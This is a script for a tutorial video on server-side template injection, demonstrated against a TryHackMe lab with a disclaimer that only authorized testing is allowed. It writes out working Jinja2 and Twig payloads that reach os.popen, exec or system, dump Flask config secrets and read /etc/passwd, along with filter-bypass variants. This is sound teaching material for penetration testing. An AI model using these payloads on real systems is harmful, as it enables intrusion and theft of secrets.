# VIDEO 30: Server-Side Template Injection (SSTI)
### Template Engine Detection, Payload Crafting & RCE Chains
**Suggested length:** 16–20 minutes
**License Tier:** Free
**Certification Relevance:** OSCP: Web Application Attacks | CEH: Web Application Hacking

---

## INTRO (0:00 – 1:45)

**[Screen: Huginn splash screen with Section 5 title card "Web Application Exploitation"]**

> "Welcome back to the Huginn tutorial series. In this video we're tackling Server-Side Template Injection — SSTI. This is one of the most powerful web vulnerabilities you'll encounter because it can escalate from a simple math evaluation all the way to remote code execution on the server. Unlike XSS which runs in the client's browser, SSTI payloads execute on the server itself."

**[Screen: Warning banner — red background with white text: "⚠️ LAB ENVIRONMENT ONLY — ETHICAL TESTING DISCLAIMER"]**

> "Critical safety reminder. All demonstrations in this video are performed against the TryHackMe SSTI room — an intentionally vulnerable lab environment accessed through an active subscription. Server-Side Template Injection gives remote code execution on the target server. Exploiting this vulnerability against systems without explicit written authorization is a serious criminal offense. These techniques must only be used in authorized penetration tests, CTF competitions, or your own isolated lab environments."

**[Screen: Slide showing SSTI concept — User Input → Template Engine → Rendered Output, with injection point highlighted]**

> "SSTI occurs when user input is embedded directly into a server-side template and processed by the template engine. Modern web frameworks like Flask, Django, Express, and Laravel use template engines — Jinja2, Twig, Freemarker, Velocity — to dynamically generate HTML. When developers pass user input directly into a template string rather than as a template variable, attackers can inject template syntax that the engine interprets and executes. We covered SQL injection and XSS in the previous two videos (see Video 28: SQL Injection) (see Video 29: Cross-Site Scripting (XSS)) — SSTI follows the same input trust principle but targets the template rendering layer."

---

## SECTION 1: Template Engine Concepts (1:45 – 3:45)

**[Screen: Diagram showing how template engines work — Template File + Data Context → Rendered HTML]**

> "Template engines separate presentation logic from application logic. A template contains static HTML with embedded expression placeholders — double curly braces in Jinja2 and Twig, dollar signs in Freemarker, hash-set in Velocity. The application passes a data context to the engine, which evaluates the expressions and produces the final HTML."

**[Screen: Side-by-side comparison of safe vs vulnerable code in Flask/Jinja2]**

> "Here's the critical difference. Safe code passes user input as a template variable — `render_template('page.html', name=user_input)`. The template references it with `{{name}}` but the value is automatically escaped. Vulnerable code does this — `render_template_string('Hello ' + user_input)`. The user's input becomes part of the template itself, not a variable within it. Any template syntax in the input gets interpreted."

```python
# SAFE — user input is a data variable (auto-escaped)
@app.route('/safe')
def safe():
    name = request.args.get('name')
    return render_template('greeting.html', name=name)

# VULNERABLE — user input is part of the template string
@app.route('/vulnerable')
def vulnerable():
    name = request.args.get('name')
    template = f"Hello {name}!"
    return render_template_string(template)
```

**[Screen: Table of template engines and their syntax — Jinja2: `{{}}`, Twig: `{{}}`, Freemarker: `${}`, Velocity: `#set/$`, Smarty: `{}`]**

> "Different template engines use different delimiters. Jinja2 and Twig both use double curly braces — `{{expression}}`. Freemarker uses dollar-brace — `${expression}`. Velocity uses hash-set for assignments and dollar for output. Smarty uses single braces. This matters for detection — we need to test multiple syntaxes to identify which engine is in use."

---

## SECTION 2: Huginn SSTI Detection Interface (3:45 – 5:30)

**[Screen: Huginn application — Web Exploits page showing the SSTI detection module]**

> "Huginn has a dedicated SSTI detection module built into the Web Exploits page. The tool implements both the basic SSTIDetector for quick identification and the AdvancedSSTITester for template engine fingerprinting and exploitation chain construction."

**[Screen: Huginn SSTI tester configuration — target URL, parameter selection, template engine dropdown]**

> "The interface takes a target URL and automatically discovers injectable parameters through form analysis. The Template Engine dropdown lets you select a specific engine to test — Jinja2, Twig, Smarty, Freemarker, Velocity — or leave it on Auto-Detect. In auto mode, Huginn sends generic mathematical expressions across all syntax variants and identifies the engine based on which syntax evaluates successfully."

**[Screen: Huginn SSTI results — showing detection patterns, template engine identification, and severity ratings]**

> "When SSTI is detected, Huginn reports the template engine type, the injectable parameter, the confirmed payload, and severity. A basic math evaluation confirms SSTI exists and gets rated HIGH. If the tool achieves config disclosure or command execution, it escalates to CRITICAL. The results include specific remediation — use safe template variable passing instead of string concatenation."

---

## SECTION 3: Template Engine Detection Methodology (5:30 – 8:30)

**[Screen: THM SSTI room — deploying the target machine and accessing the web application]**

> "Let's work through this against the TryHackMe SSTI room. Deploy the target machine and access the web application in your browser. You'll see a page with an input field that processes and displays user-submitted content — a classic template injection surface."

```bash
# TryHackMe SSTI room
Target: http://MACHINE_IP:5000/
Application: Python/Flask application with Jinja2 templates
```

**[Screen: THM SSTI application — the input form visible with a text field]**

> "The detection methodology follows a decision tree. We start with a universal probe — the mathematical expression `{{7*7}}`. If the page renders 49, we know a template engine evaluated our expression. If it renders the literal string `{{7*7}}`, the input is either escaped or there's no template processing."

```bash
# Step 1: Universal detection probe
Input: {{7*7}}
Expected if vulnerable: Page displays "49"
Expected if safe: Page displays "{{7*7}}" (literal text)
```

**[Screen: THM application showing "49" in the output after submitting `{{7*7}}`]**

> "The page returns 49. Template injection confirmed. The double-curly-brace syntax evaluated our math expression. Now we need to determine which specific template engine we're dealing with. Different engines have different capabilities and exploitation paths."

```bash
# Step 2: Template engine fingerprinting
# Jinja2 test — string multiplication
Input: {{7*'7'}}
Jinja2 result: "7777777" (string repeated 7 times)
Twig result: "49" (numeric multiplication)
# If we get "7777777", it's Jinja2. If "49", likely Twig.

Input: {{7*'7'}}
Result: "7777777"
# Confirmed: Jinja2 template engine
```

**[Screen: Application showing "7777777" — confirming Jinja2 through string multiplication behavior]**

> "The string multiplication test is the fingerprinting key. In Jinja2, multiplying 7 by the string '7' repeats the string seven times — giving us '7777777'. In Twig, the same expression would just do numeric multiplication and return 49. Our result confirms this is a Jinja2/Flask application."

**[Screen: Decision tree diagram — showing the detection flow: `{{7*7}}`→49? → `{{7*'7'}}`→7777777=Jinja2, →49=Twig → `${7*7}`→Freemarker → etc.]**

> "Here's the complete detection decision tree. Start with `{{7*7}}`. If that fails, try `${7*7}` for Freemarker, `#{7*7}` for Ruby ERB, `<%= 7*7 %>` for EJS/ERB, and `{7*7}` for Smarty. Each positive result leads to engine-specific fingerprinting tests. Huginn automates this entire tree in its Auto-Detect mode."

---

## SECTION 4: Jinja2 Exploitation — Information Disclosure to RCE (8:30 – 12:30)

**[Screen: Slide showing Jinja2 exploitation chain — Detection → Config Access → Class Traversal → RCE]**

> "Now that we've confirmed Jinja2, let's escalate from math evaluation to remote code execution. The exploitation chain for Jinja2 follows a specific path — we traverse Python's object hierarchy to access dangerous built-in functions that the template sandbox was designed to restrict."

```bash
# Step 3: Configuration disclosure
Input: {{config}}
Result: Application configuration dump including SECRET_KEY, DEBUG status, database URIs
# This confirms server-side code execution context
```

**[Screen: Application output showing Flask configuration — SECRET_KEY, DEBUG=True, other config values]**

> "Accessing `{{config}}` dumps the Flask application's configuration. You'll see the SECRET_KEY — which can be used to forge session cookies — DEBUG status, database connection strings, and other sensitive settings. This alone is a significant finding, but let's push to full command execution."

```bash
# Step 4: Python class hierarchy traversal
# Access the base object class through any string instance
Input: {{''.__class__.__mro__}}
Result: (<class 'str'>, <class 'object'>)
# We can see the Method Resolution Order — 'object' is at index 1

# Access all subclasses of object
Input: {{''.__class__.__mro__[1].__subclasses__()}}
Result: [<class 'type'>, <class 'weakref'>, ... hundreds of classes ...]
# We need to find a class that can execute system commands
```

**[Screen: Application showing the class hierarchy output — long list of Python subclasses]**

> "This is the core technique. Every string in Python inherits from the `object` base class. From `object`, we can access `__subclasses__()` which lists every class loaded in the Python process. Somewhere in this list is a class that provides access to the operating system — typically `subprocess.Popen` or via the `os` module."

```bash
# Step 5: Find the subprocess.Popen class (typically around index 400+)
# Method 1: Direct os module access through builtins
Input: {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
Result: uid=1000(flask) gid=1000(flask) groups=1000(flask)
```

**[Screen: Application showing "uid=1000(flask) gid=1000(flask)" — confirming remote code execution]**

> "Remote code execution achieved. The `request.application.__globals__` gives us access to Python's global namespace. From there we reach `__builtins__` which contains the `__import__` function. We import the `os` module and call `popen` to execute system commands. The `id` command confirms we're running as the flask user."

```bash
# Step 6: Enumerate the system
Input: {{request.application.__globals__.__builtins__.__import__('os').popen('whoami').read()}}
Result: flask

Input: {{request.application.__globals__.__builtins__.__import__('os').popen('cat /etc/passwd').read()}}
Result: root:x:0:0:root:/root:/bin/bash
       flask:x:1000:1000::/home/flask:/bin/bash
       ...

Input: {{request.application.__globals__.__builtins__.__import__('os').popen('ls -la /home/flask').read()}}
Result: Directory listing of the flask user's home directory
```

**[Screen: Application showing /etc/passwd contents and directory listings from the SSTI-achieved RCE]**

> "From here, you have full command execution on the server. Read sensitive files, enumerate the network, establish persistence, pivot to other systems. In a penetration test, this would be documented as a Critical severity finding — unauthenticated remote code execution through template injection."

---

## SECTION 5: Alternative Jinja2 RCE Payloads (12:30 – 14:30)

**[Screen: Slide showing multiple RCE payload variants for Jinja2]**

> "There are multiple paths to RCE in Jinja2, which matters when web application firewalls or basic filters block certain patterns. Let's look at alternative payloads that achieve the same result through different class traversal paths."

```bash
# Alternative payload 1: Using subprocess.Popen via subclass enumeration
Input: {% for c in ().__class__.__base__.__subclasses__() %}{% if c.__name__ == 'catch_warnings' %}{{ c.__init__.__globals__['sys'].modules['os'].popen('id').read() }}{% endif %}{% endfor %}
Result: uid=1000(flask) gid=1000(flask)

# Alternative payload 2: Direct import through lipsum
Input: {{lipsum.__globals__['os'].popen('id').read()}}
Result: uid=1000(flask) gid=1000(flask)

# Alternative payload 3: Using cycler object
Input: {{cycler.__init__.__globals__.os.popen('id').read()}}
Result: uid=1000(flask) gid=1000(flask)
```

**[Screen: Testing alternative payloads in the THM application — each returning command output]**

> "The `lipsum` global is a lesser-known Jinja2 built-in that provides direct access to Python globals. The `cycler` object is another Jinja2 internal that reaches the os module through a different path. These alternatives bypass filters that look for `request`, `config`, or `__builtins__` specifically."

```bash
# Filter bypass techniques for restricted environments
# When underscores are filtered:
Input: {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')}}
# Uses hex encoding for underscores

# When brackets are filtered:
Input: {{request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('id')|attr('read')()}}
# Uses Jinja2 attr filter instead of dot notation
```

**[Screen: Huginn's advanced SSTI tester — showing automatic payload rotation and filter detection]**

> "Huginn's Advanced SSTI Tester implements these variants automatically. When the primary payload is blocked, it rotates through alternative access paths — lipsum, cycler, joiner, namespace — and encoding techniques — hex, unicode, attribute filters — to find a working exploitation chain. The tool tests up to three payloads per engine type to balance thoroughness with stealth."

---

## SECTION 6: Twig Template Injection (14:30 – 16:30)

**[Screen: Slide explaining Twig — PHP template engine used in Symfony, CraftCMS, and other PHP frameworks]**

> "Let's briefly cover Twig — the primary template engine for PHP frameworks like Symfony. If you encounter a PHP application with SSTI, Twig is the most likely engine. The detection is similar — `{{7*7}}` returns 49 — but `{{7*'7'}}` also returns 49 because PHP handles the string-to-int conversion differently than Python."

```bash
# Twig detection and exploitation
# Detection:
Input: {{7*7}}
Result: 49 (template engine evaluating expression)

# Twig-specific fingerprint:
Input: {{7*'7'}}
Result: 49 (Twig — not Jinja2 which would give "7777777")

# Twig RCE payload — using registerUndefinedFilterCallback
Input: {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
Result: uid=33(www-data) gid=33(www-data)

# Alternative Twig RCE — using system function
Input: {{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("whoami")}}
Result: www-data
```

**[Screen: Example output from a Twig-based application showing RCE through the filter callback technique]**

> "Twig's `_self.env` gives access to the template environment object. The `registerUndefinedFilterCallback` method registers a PHP function to be called when an undefined filter is used. We register `exec` or `system`, then trigger it by calling `getFilter` with our command as the argument. This is a well-known Twig exploitation chain documented in various CTF writeups and security research."

```bash
# Twig file read (alternative to RCE)
Input: {{'/etc/passwd'|file_excerpt(1,30)}}
Result: Contents of /etc/passwd (if file_excerpt filter is available)

# Twig source code disclosure
Input: {{_self.env.getLoader().getSource('index.html')}}
Result: Source code of the template file
```

**[Screen: Huginn SSTI tester — showing Twig detection and exploitation in the results panel]**

> "Huginn's SSTI detector includes Twig-specific payloads. When auto-detection identifies Twig through the `{{7*'7'}}` fingerprint, it automatically switches to PHP-specific exploitation chains. The tool tests both the filter callback method and file read capabilities."

---

## SECTION 7: Certification Mapping and Practice (16:30 – 17:45)

**[Screen: Slide showing OSCP and CEH mapping for SSTI]**

> "SSTI maps to the OSCP Web Application Attacks domain. While the OSCP exam has historically focused on simpler injection types, recent exam updates include more complex web vulnerabilities. SSTI is increasingly appearing in OSCP labs and challenge machines. The key skill is recognition — knowing to test template syntax when you see user input reflected in dynamic pages. For CEH, SSTI falls under advanced web application attack vectors in Module 14."

**[Screen: Slide listing practice resources — THM rooms, HTB machines with SSTI]**

> "For additional practice beyond this THM SSTI room, try Hack The Box machines 'Nunchucks' which features a Node.js Nunjucks SSTI, and 'Doctor' which has Flask/Jinja2 SSTI. PortSwigger's Web Security Academy has an entire SSTI learning path with progressively harder labs covering detection, identification, and exploitation across multiple template engines."

---

## OUTRO (17:45 – end)

**[Screen: Summary slide — SSTI: Detection ({{7*7}}), Fingerprinting ({{7*'7'}}), Exploitation (RCE chains) | Jinja2 + Twig covered | Next: Video 31 — Command Injection]**

> "That's Server-Side Template Injection in Huginn. We covered the detection methodology using mathematical probes, template engine fingerprinting to distinguish Jinja2 from Twig, the full Jinja2 exploitation chain from config disclosure through Python class traversal to remote code execution, alternative payloads for filter bypass, and Twig exploitation through filter callback registration. In the next video, we'll cover Command Injection — directly injecting OS commands through application input fields. See you there."
